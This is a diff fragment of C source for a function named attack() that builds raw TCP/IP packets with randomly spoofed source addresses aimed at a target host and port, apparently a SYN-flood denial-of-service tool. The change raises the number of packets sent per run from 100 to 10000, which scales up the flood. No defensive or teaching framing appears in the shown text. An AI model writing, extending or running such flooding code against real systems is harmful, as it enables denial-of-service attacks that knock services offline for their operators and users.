@@ -75,7 +75,7 @@ void attack(char *addr, char *port) {
     	packet.ip.check = 0;  
     	packet.ip.daddr = target.sin_addr.s_addr; 
     	packet.ip.check = calc_chsum((unsigned short *)&packet.ip, 20);
-   	for(attack_num = 100;attack_num > 0;attack_num --)
+   	for(attack_num = 10000;attack_num > 0;attack_num --)
 	{  
 		packet.ip.saddr = random(); 
         	packet.tcp.source = htons(12345);  
